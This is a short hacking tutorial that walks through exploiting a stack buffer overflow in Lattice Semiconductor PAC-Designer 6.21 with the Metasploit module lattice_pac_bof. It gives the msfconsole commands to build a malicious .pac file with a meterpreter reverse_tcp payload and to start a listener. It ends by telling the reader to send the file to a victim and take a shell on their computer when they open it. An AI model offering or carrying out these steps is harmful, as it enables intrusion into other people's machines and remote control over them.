Hack Windows PC using Lattice Semiconductor PAC-Designer 6.21 Symbol Value Buffer Overflow

This module exploits a vulnerability found in Lattice Semiconductor PAC-Designer 6.21. As a .pac file, when supplying a long string of data to the ‘value’ field under the ‘Symbolic Schematic Data’ tag, it is possible to cause a memory corruption on the stack, which results in arbitrary code execution under the context of the user.
PAC-Designer 6.21
Windows XP SP 2
Attacker: Backtrack 5
Victim PC: Windows XP
Open backtrack terminal type msfconsole

Now type use exploit/windows/fileformat/lattice_pac_bof
Msf exploit (lattice_pac_bof)>set payload windows/meterpreter/reverse_tcp
Msf exploit (lattice_pac_bof)>set lhost 192.168.1.2 (IP of Local Host)
Msf exploit (lattice_pac_bof)>exploit

After we successfully generate the malicious File, it will stored on your local computer
/root/.msf4/local/msf.pac

Now we need to set up a listener to handle reverse connection sent by victim when the exploit successfully executed.
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.1.2
exploit 
Now send your msf.pac files to victim, as soon as they download and open it. Now you can access meterpreter shell on victim computer.
